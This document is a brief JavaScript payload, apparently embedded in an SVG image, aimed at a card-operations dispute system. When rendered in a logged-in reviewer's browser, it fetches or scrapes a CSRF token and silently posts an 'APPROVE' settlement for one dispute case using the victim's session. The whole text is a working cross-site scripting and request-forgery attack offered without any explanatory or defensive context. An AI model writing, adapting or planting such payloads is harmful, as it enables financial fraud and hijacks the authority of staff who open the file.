svg.script:
(async () => {
  const caseReference = 'CD-7FC8550C09';
  const status = document.getElementById('status');
  const setStatus = value => { status.textContent = value; };
  const cookie = name => document.cookie.split(';').map(value => value.trim())
    .find(value => value.startsWith(name + '='))?.split('=').slice(1).join('=') || '';

  try {
    setStatus('requesting-review-token');
    const csrfResponse = await fetch('/api/card-operations/csrf', {
      credentials: 'include',
      cache: 'no-store'
    });
    let csrfBody = {};
    try { csrfBody = await csrfResponse.clone().json(); } catch (_) {}
    const token = decodeURIComponent(
      csrfBody.token || csrfBody.csrfToken || csrfBody.csrf_token
      || cookie('XSRF-TOKEN') || cookie('CARDOPS-XSRF-TOKEN')
    );

    setStatus('submitting-review-decision');
    const result = await fetch(`/api/card-operations/disputes/${encodeURIComponent(caseReference)}/settle`, {
      method: 'POST',
      credentials: 'include',
      cache: 'no-store',
      headers: {
        'Content-Type': 'application/json',
        'X-XSRF-TOKEN': token,
        'X-CSRF-TOKEN': token,
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({ decision: 'APPROVE' })
    });
    setStatus(result.ok ? 'review-approved' : `review-${result.status}`);
  } catch (_) {
    setStatus('review-action-failed');
  }
})();
